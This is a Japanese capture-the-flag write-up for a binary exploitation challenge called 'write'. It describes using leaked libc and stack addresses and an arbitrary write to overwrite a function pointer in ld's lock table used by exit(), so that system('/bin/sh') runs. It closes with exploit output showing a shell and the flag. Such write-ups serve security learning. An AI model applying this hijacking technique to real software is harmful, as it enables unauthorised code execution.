# Solution

```
$ checksec ./write
[*] '/home/jinnzoo/ctf/bytebanditsctf2020/write/dist/write'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

起動すると以下のようなメニューが表示される。
```
$ ./write
puts: 0x7fcd01e3e9c0
stack: 0x7ffdb57ea308
===Menu===
(w)rite
(q)uit
```

親切にlibc内のputsのアドレスとstackのmain関数のリターンアドレス付近のアドレスを表示してくれる。      
またwriteで任意のアドレスへ書き込み可能。（ユーザ入力はscanf('%lu')という形式で受け取る。）       
      
以上より、main関数のリターンアドレスをone_gadgetに書き換えて終了のつもりで進めていたら以下のことが判明した。    
+ リターンアドレス上書きによるrip操作は出来ないことが分かった。
  + 本プログラムはmain関数からリターンせずexit関数を使用してプログラムを終了する。
  + menuのwriteによる任意アドレス上書きはmain関数内で実行される。
      
上記に加えて、PIE有効であるため、残された手段としてexit関数をフックできないか考えていたら、以下のwriteupが見つかった。これを参考にexit関数が参照する関数テーブルを上書きし、system('/bin/sh')を呼び出すことによりシェル起動成功。
ちなみに、one_gadgetは全て失敗したため、systemを呼び出すやり方にしている。
+ https://hama.hatenadiary.jp/entry/2018/11/13/221544
  ```
  exit()を実行する際に呼ばれる処理を追っていくと、__GI_exit() -> __run_exit_handlers() -> _dl_fini() 経由で rtld_lock_default_lock_recursive()とrtld_lock_default_unlock_recursive()
  が呼び出される。2つの関数はldのrwな領域にある関数テーブルに登録されており、これを書き換えると制御を奪える。
  rtld_lock_default_lock_recursive()をsystem()に書き換え、呼び出し時にrdiが指している領域へ/bin/shを書き込んでおくことで、system("/bin/sh")が呼び出されシェルを取れる。
  ```

```
$ python3 exploit.py
[+] Opening connection to pwn.byteband.it on port 9000: Done
[*] Switching to interactive mode
 ===Menu===
(w)rite
(q)uit
===Menu=== (w)rite
(q)uit
$ ls
flag.txt
write
$ cat flag.txt
flag{imma_da_pwn_mAst3r}
```
